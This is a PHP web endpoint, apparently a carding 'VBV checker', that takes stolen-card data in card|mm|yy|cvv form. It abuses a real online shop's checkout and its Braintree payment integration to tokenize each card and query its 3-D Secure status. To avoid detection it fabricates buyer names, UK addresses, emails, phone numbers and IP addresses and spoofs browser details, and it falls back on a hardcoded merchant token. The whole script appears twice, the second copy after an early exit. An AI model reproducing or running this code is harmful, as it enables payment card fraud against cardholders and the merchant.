<?php

// Optimize for Railway deployment
set_time_limit(60);
ini_set('max_execution_time', 60);
error_reporting(0);
ini_set('display_errors', 0);

// Prevent double output
ob_start();

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET');

// Get card from query parameter
$cardInput = $_GET['cc'] ?? '';

if (empty($cardInput)) {
    http_response_code(400);
    echo json_encode(['error' => 'Missing cc parameter']);
    exit;
}

// Parse card
$cardParts = array_map('trim', explode('|', $cardInput));

if (count($cardParts) < 4) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid format']);
    exit;
}

$c = preg_replace('/\s+/', '', $cardParts[0]);
$mm = str_pad($cardParts[1], 2, '0', STR_PAD_LEFT);
$yy = $cardParts[2];
$cvc = $cardParts[3];

if (strlen($yy) == 4) {
    $yy = substr($yy, -2);
} else {
    $yy = str_pad($yy, 2, '0', STR_PAD_LEFT);
}

// Validate
if (!preg_match('/^\d{13,19}$/', $c) || $mm < 1 || $mm > 12 || !preg_match('/^\d{3,4}$/', $cvc)) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid card data']);
    exit;
}

// Helper functions
function rName() {
    $f = ['James','John','Robert','Michael','William','David','Richard','Joseph','Thomas','Charles'];
    $l = ['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller','Davis','Rodriguez','Martinez'];
    return ['first' => $f[array_rand($f)], 'last' => $l[array_rand($l)]];
}

function rAddr() {
    $s = ['High Street','Station Road','Main Street','Park Road','Church Lane','Victoria Road','Green Lane','Manor Road'];
    $c = ['LONDON','MANCHESTER','BIRMINGHAM','LEEDS','LIVERPOOL','BRISTOL','SHEFFIELD','NEWCASTLE'];
    $p = ['SW1A 1AA','M1 1AE','B1 1AA','LS1 1AA','L1 1AA','BS1 1AA','S1 1AA','NE1 1AA'];
    $i = array_rand($c);
    return ['street' => rand(1,999).' '.$s[array_rand($s)], 'city' => $c[$i], 'postcode' => $p[$i], 'country' => 'GB'];
}

function rEmail($f, $l) {
    $d = ['gmail.com','yahoo.com','outlook.com','hotmail.com'];
    return strtolower($f).'.'.strtolower($l).rand(100,999).'@'.$d[array_rand($d)];
}

function uuid() {
    return sprintf('%08x-%04x-%04x-%04x-%012x', rand(0,0xffffffff), rand(0,0xffff), rand(0,0xffff), rand(0,0xffff), rand(0,0xffffffffffff));
}

$name = rName();
$firstName = $name['first'];
$lastName = $name['last'];
$address = rAddr();
$email = rEmail($firstName, $lastName);
$phone = '0'.rand(7000000000,7999999999);

// cURL setup
$ch = curl_init();
$cookieFile = sys_get_temp_dir().'/vbv_'.md5(uniqid());
$ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36';

curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_USERAGENT => $ua,
    CURLOPT_COOKIEJAR => $cookieFile,
    CURLOPT_COOKIEFILE => $cookieFile,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_TIMEOUT => 30,
    CURLOPT_CONNECTTIMEOUT => 10,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_ENCODING => 'gzip, deflate',
]);

// Load product
curl_setopt($ch, CURLOPT_URL, 'https://www.xlifter.com/produkt/xlifter/');
$resp = curl_exec($ch);

if (!$resp) {
    http_response_code(500);
    echo json_encode(['error' => 'Service unavailable']);
    curl_close($ch);
    @unlink($cookieFile);
    exit;
}

preg_match('/name="add-to-cart"\s+value="(\d+)"/', $resp, $pm);
$pid = $pm[1] ?? '329';
preg_match('/<span class="woocommerce-Price-amount[^>]*>([^<]+)</', $resp, $pr);
$price = isset($pr[1]) ? preg_replace('/[^\d.]/', '', $pr[1]) : '549.00';

// Add to cart
$boundary = '----WKF'.bin2hex(random_bytes(8));
$post = "--$boundary\r\nContent-Disposition: form-data; name=\"quantity\"\r\n\r\n1\r\n";
$post .= "--$boundary\r\nContent-Disposition: form-data; name=\"add-to-cart\"\r\n\r\n$pid\r\n";
$post .= "--$boundary\r\nContent-Disposition: form-data; name=\"gtm4wp_product_data\"\r\n\r\n";
$post .= '{"internal_id":329,"item_id":329,"item_name":"XLifter X2","sku":"XL-X2-LR34RRS","price":549}';
$post .= "\r\n--$boundary--\r\n";

curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.xlifter.com/produkt/xlifter/',
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $post,
    CURLOPT_HTTPHEADER => ["Content-Type: multipart/form-data; boundary=$boundary", "User-Agent: $ua"],
]);
curl_exec($ch);

$amount = number_format((float)$price + 47.00, 2, '.', '');

// Get token
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.xlifter.com/checkout-page/',
    CURLOPT_POST => false,
    CURLOPT_HTTPHEADER => ["User-Agent: $ua"],
]);
$resp = curl_exec($ch);

$token = null;
if (preg_match('/wc_braintree_client_token\s*=\s*\["([^"]+)"/', $resp, $tm)) {
    $dec = json_decode(base64_decode($tm[1]), true);
    $token = $dec['authorizationFingerprint'] ?? null;
}

if (!$token) {
    $token = 'eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NzI4ODMwODEsImp0aSI6ImMwYmYwMzk0LWJjOWYtNDJiMy05MWY4LWI3YzQ4OTM4MGU4MyIsInN1YiI6IjhtdzZkOGd4bjljbWpoOHQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjhtdzZkOGd4bjljbWpoOHQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6InhsaWZ0ZXJFVVIifX0.sejp_0BUDYPJ0EBlAcHvpkXYl10WT9xdfkvD3dmpDNzohIM8q8lUa5PeUCbWVNi4cWV1tteSRR_YpJ20EIPq4g';
}

// Tokenize
$sid = uuid();
$data = [
    'clientSdkMetadata' => ['source' => 'client', 'integration' => 'dropin2', 'sessionId' => $sid],
    'query' => 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
    'variables' => ['input' => ['creditCard' => ['number' => $c, 'expirationMonth' => $mm, 'expirationYear' => $yy, 'cvv' => $cvc], 'options' => ['validate' => false]]],
    'operationName' => 'TokenizeCreditCard',
];

curl_setopt_array($ch, [
    CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($data),
    CURLOPT_HTTPHEADER => ["Authorization: Bearer $token", 'Braintree-Version: 2018-05-10', 'Content-Type: application/json', "User-Agent: $ua"],
]);

$resp = curl_exec($ch);
$rd = json_decode($resp, true);

if (!isset($rd['data']['tokenizeCreditCard']['token'])) {
    http_response_code(500);
    echo json_encode(['error' => 'Tokenization failed']);
    curl_close($ch);
    @unlink($cookieFile);
    exit;
}

$tok = $rd['data']['tokenizeCreditCard']['token'];
$bin = $rd['data']['tokenizeCreditCard']['creditCard']['bin'];

// 3DS lookup
$sh = [667,736,812,844,896,926];
$sw = [375,414,390,428];
$data = [
    'amount' => $amount,
    'browserColorDepth' => 24,
    'browserJavaEnabled' => false,
    'browserJavascriptEnabled' => true,
    'browserLanguage' => 'en-GB',
    'browserScreenHeight' => $sh[array_rand($sh)],
    'browserScreenWidth' => $sw[array_rand($sw)],
    'browserTimeZone' => -330,
    'deviceChannel' => 'Browser',
    'additionalInfo' => [
        'shippingGivenName' => $firstName,
        'shippingSurname' => $lastName,
        'ipAddress' => rand(1,255).'.'.rand(1,255).'.'.rand(1,255).'.'.rand(1,255),
        'billingLine1' => $address['street'],
        'billingLine2' => '',
        'billingCity' => $address['city'],
        'billingState' => '',
        'billingPostalCode' => $address['postcode'],
        'billingCountryCode' => $address['country'],
        'billingPhoneNumber' => $phone,
        'billingGivenName' => $firstName,
        'billingSurname' => $lastName,
        'shippingLine1' => $address['street'],
        'shippingLine2' => '',
        'shippingCity' => $address['city'],
        'shippingState' => '',
        'shippingPostalCode' => $address['postcode'],
        'shippingCountryCode' => $address['country'],
        'email' => $email,
    ],
    'bin' => $bin,
    'dfReferenceId' => '0_'.uuid(),
    'clientMetadata' => [
        'requestedThreeDSecureVersion' => '2',
        'sdkVersion' => 'web/3.133.0',
        'cardinalDeviceDataCollectionTimeElapsed' => rand(400,600),
        'issuerDeviceDataCollectionTimeElapsed' => rand(8000,9000),
        'issuerDeviceDataCollectionResult' => true,
    ],
    'authorizationFingerprint' => $token,
    'braintreeLibraryVersion' => 'braintree/web/3.133.0',
    '_meta' => [
        'merchantAppId' => 'www.xlifter.com',
        'platform' => 'web',
        'sdkVersion' => '3.133.0',
        'source' => 'client',
        'integration' => 'custom',
        'integrationType' => 'custom',
        'sessionId' => uuid(),
    ],
];

curl_setopt_array($ch, [
    CURLOPT_URL => "https://api.braintreegateway.com/merchants/8mw6d8gxn9cmjh8t/client_api/v1/payment_methods/$tok/three_d_secure/lookup",
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($data),
    CURLOPT_HTTPHEADER => ['Content-Type: application/json', "User-Agent: $ua"],
]);

$resp = curl_exec($ch);
$rd = json_decode($resp, true);

curl_close($ch);
@unlink($cookieFile);

$vbv = $rd['paymentMethod']['threeDSecureInfo']['status'] ?? 'unknown';

// Clear any previous output
ob_end_clean();

// Send response
header('Content-Type: application/json');
echo json_encode(['vbv' => $vbv]);
exit;

// Get card from query parameter
$cardInput = $_GET['cc'] ?? '';

if (empty($cardInput)) {
    echo json_encode(['error' => 'Missing cc parameter']);
    exit;
}

// Parse card
$cardParts = array_map('trim', explode('|', $cardInput));

if (count($cardParts) < 4) {
    echo json_encode(['error' => 'Invalid card format. Use: card|mm|yy|cvv']);
    exit;
}

$c = preg_replace('/\s+/', '', $cardParts[0]);
$mm = str_pad($cardParts[1], 2, '0', STR_PAD_LEFT);
$yy = $cardParts[2];
$cvc = $cardParts[3];

// Handle 4-digit year
if (strlen($yy) == 4) {
    $yy = substr($yy, -2);
} else {
    $yy = str_pad($yy, 2, '0', STR_PAD_LEFT);
}

// Validate
if (!preg_match('/^\d{13,19}$/', $c)) {
    echo json_encode(['error' => 'Invalid card number']);
    exit;
}
if ($mm < 1 || $mm > 12) {
    echo json_encode(['error' => 'Invalid month']);
    exit;
}
if (!preg_match('/^\d{3,4}$/', $cvc)) {
    echo json_encode(['error' => 'Invalid CVV']);
    exit;
}

// Generate random user data
function generateRandomName() {
    $firstNames = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles'];
    $lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez'];
    return [
        'first' => $firstNames[array_rand($firstNames)],
        'last' => $lastNames[array_rand($lastNames)]
    ];
}

function generateRandomAddress() {
    $streets = ['High Street', 'Station Road', 'Main Street', 'Park Road', 'Church Lane', 'Victoria Road', 'Green Lane', 'Manor Road'];
    $cities = ['LONDON', 'MANCHESTER', 'BIRMINGHAM', 'LEEDS', 'LIVERPOOL', 'BRISTOL', 'SHEFFIELD', 'NEWCASTLE'];
    $postcodes = ['SW1A 1AA', 'M1 1AE', 'B1 1AA', 'LS1 1AA', 'L1 1AA', 'BS1 1AA', 'S1 1AA', 'NE1 1AA'];
    
    $idx = array_rand($cities);
    return [
        'street' => rand(1, 999) . ' ' . $streets[array_rand($streets)],
        'city' => $cities[$idx],
        'postcode' => $postcodes[$idx],
        'country' => 'GB'
    ];
}

function generateEmail($firstName, $lastName) {
    $domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'];
    return strtolower($firstName) . '.' . strtolower($lastName) . rand(100, 999) . '@' . $domains[array_rand($domains)];
}

function generatePhone() {
    return '0' . rand(7000000000, 7999999999);
}

function generateUUID() {
    return sprintf('%08x-%04x-%04x-%04x-%012x',
        rand(0, 0xffffffff),
        rand(0, 0xffff),
        rand(0, 0xffff),
        rand(0, 0xffff),
        rand(0, 0xffffffffffff)
    );
}

$name = generateRandomName();
$firstName = $name['first'];
$lastName = $name['last'];
$address = generateRandomAddress();
$email = generateEmail($firstName, $lastName);
$phone = generatePhone();

// Initialize cURL
$ch = curl_init();
$cookieFile = tempnam(sys_get_temp_dir(), 'cookies');
$userAgent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36';

// Load product page
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.xlifter.com/produkt/xlifter/',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_USERAGENT => $userAgent,
    CURLOPT_COOKIEJAR => $cookieFile,
    CURLOPT_COOKIEFILE => $cookieFile,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_TIMEOUT => 30,
]);

$response = curl_exec($ch);

preg_match('/name="add-to-cart"\s+value="(\d+)"/', $response, $productMatch);
$productId = $productMatch[1] ?? '329';

preg_match('/<span class="woocommerce-Price-amount[^>]*>([^<]+)</', $response, $priceMatch);
$productPrice = isset($priceMatch[1]) ? preg_replace('/[^\d.]/', '', $priceMatch[1]) : '549.00';

// Add to cart
$boundary = '----WebKitFormBoundary' . bin2hex(random_bytes(8));
$postData = "--$boundary\r\n";
$postData .= "Content-Disposition: form-data; name=\"quantity\"\r\n\r\n1\r\n";
$postData .= "--$boundary\r\n";
$postData .= "Content-Disposition: form-data; name=\"add-to-cart\"\r\n\r\n$productId\r\n";
$postData .= "--$boundary\r\n";
$postData .= "Content-Disposition: form-data; name=\"gtm4wp_product_data\"\r\n\r\n";
$postData .= '{"internal_id":329,"item_id":329,"item_name":"XLifter X2","sku":"XL-X2-LR34RRS","price":549}';
$postData .= "\r\n--$boundary--\r\n";

curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.xlifter.com/produkt/xlifter/',
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $postData,
    CURLOPT_HTTPHEADER => [
        "Content-Type: multipart/form-data; boundary=$boundary",
        "User-Agent: $userAgent"
    ],
]);

curl_exec($ch);

$amount = number_format((float)$productPrice + 47.00, 2, '.', '');

// Extract bearer token
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.xlifter.com/checkout-page/',
    CURLOPT_POST => false,
    CURLOPT_HTTPHEADER => ["User-Agent: $userAgent"],
]);

$response = curl_exec($ch);

preg_match('/wc_braintree_client_token\s*=\s*\["([^"]+)"/', $response, $tokenMatch);

$bearerToken = null;
if (isset($tokenMatch[1])) {
    $encodedToken = $tokenMatch[1];
    $decoded = base64_decode($encodedToken);
    $tokenData = json_decode($decoded, true);
    $bearerToken = $tokenData['authorizationFingerprint'] ?? null;
}

if (!$bearerToken) {
    $bearerToken = 'eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NzI4ODMwODEsImp0aSI6ImMwYmYwMzk0LWJjOWYtNDJiMy05MWY4LWI3YzQ4OTM4MGU4MyIsInN1YiI6IjhtdzZkOGd4bjljbWpoOHQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjhtdzZkOGd4bjljbWpoOHQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6InhsaWZ0ZXJFVVIifX0.sejp_0BUDYPJ0EBlAcHvpkXYl10WT9xdfkvD3dmpDNzohIM8q8lUa5PeUCbWVNi4cWV1tteSRR_YpJ20EIPq4g';
}

$merchantId = '8mw6d8gxn9cmjh8t';

// Tokenize card
$sessionId = generateUUID();

$jsonData = [
    'clientSdkMetadata' => [
        'source' => 'client',
        'integration' => 'dropin2',
        'sessionId' => $sessionId,
    ],
    'query' => 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
    'variables' => [
        'input' => [
            'creditCard' => [
                'number' => $c,
                'expirationMonth' => $mm,
                'expirationYear' => $yy,
                'cvv' => $cvc,
            ],
            'options' => [
                'validate' => false,
            ],
        ],
    ],
    'operationName' => 'TokenizeCreditCard',
];

curl_setopt_array($ch, [
    CURLOPT_URL => 'https://payments.braintree-api.com/graphql',
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($jsonData),
    CURLOPT_HTTPHEADER => [
        "Authorization: Bearer $bearerToken",
        'Braintree-Version: 2018-05-10',
        'Content-Type: application/json',
        "User-Agent: $userAgent",
    ],
]);

$response = curl_exec($ch);
$responseData = json_decode($response, true);

if (!isset($responseData['data']['tokenizeCreditCard']['token'])) {
    echo json_encode(['error' => 'Tokenization failed', 'response' => $responseData]);
    curl_close($ch);
    unlink($cookieFile);
    exit;
}

$tok = $responseData['data']['tokenizeCreditCard']['token'];
$binNumber = $responseData['data']['tokenizeCreditCard']['creditCard']['bin'];

// 3D Secure lookup
$dfReferenceId = '0_' . generateUUID();
$sessionId2 = generateUUID();
$randomIp = rand(1, 255) . '.' . rand(1, 255) . '.' . rand(1, 255) . '.' . rand(1, 255);
$screenHeights = [667, 736, 812, 844, 896, 926];
$screenWidths = [375, 414, 390, 428];

$jsonData = [
    'amount' => $amount,
    'browserColorDepth' => 24,
    'browserJavaEnabled' => false,
    'browserJavascriptEnabled' => true,
    'browserLanguage' => 'en-GB',
    'browserScreenHeight' => $screenHeights[array_rand($screenHeights)],
    'browserScreenWidth' => $screenWidths[array_rand($screenWidths)],
    'browserTimeZone' => -330,
    'deviceChannel' => 'Browser',
    'additionalInfo' => [
        'shippingGivenName' => $firstName,
        'shippingSurname' => $lastName,
        'ipAddress' => $randomIp,
        'billingLine1' => $address['street'],
        'billingLine2' => '',
        'billingCity' => $address['city'],
        'billingState' => '',
        'billingPostalCode' => $address['postcode'],
        'billingCountryCode' => $address['country'],
        'billingPhoneNumber' => $phone,
        'billingGivenName' => $firstName,
        'billingSurname' => $lastName,
        'shippingLine1' => $address['street'],
        'shippingLine2' => '',
        'shippingCity' => $address['city'],
        'shippingState' => '',
        'shippingPostalCode' => $address['postcode'],
        'shippingCountryCode' => $address['country'],
        'email' => $email,
    ],
    'bin' => $binNumber,
    'dfReferenceId' => $dfReferenceId,
    'clientMetadata' => [
        'requestedThreeDSecureVersion' => '2',
        'sdkVersion' => 'web/3.133.0',
        'cardinalDeviceDataCollectionTimeElapsed' => rand(400, 600),
        'issuerDeviceDataCollectionTimeElapsed' => rand(8000, 9000),
        'issuerDeviceDataCollectionResult' => true,
    ],
    'authorizationFingerprint' => $bearerToken,
    'braintreeLibraryVersion' => 'braintree/web/3.133.0',
    '_meta' => [
        'merchantAppId' => 'www.xlifter.com',
        'platform' => 'web',
        'sdkVersion' => '3.133.0',
        'source' => 'client',
        'integration' => 'custom',
        'integrationType' => 'custom',
        'sessionId' => $sessionId2,
    ],
];

curl_setopt_array($ch, [
    CURLOPT_URL => "https://api.braintreegateway.com/merchants/$merchantId/client_api/v1/payment_methods/$tok/three_d_secure/lookup",
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($jsonData),
    CURLOPT_HTTPHEADER => [
        'Content-Type: application/json',
        "User-Agent: $userAgent",
    ],
]);

$response = curl_exec($ch);
$responseData = json_decode($response, true);

$vbv = $responseData['paymentMethod']['threeDSecureInfo']['status'] ?? 'unknown';

// Cleanup
curl_close($ch);
unlink($cookieFile);

// Return result
echo json_encode(['vbv' => $vbv]);

?>
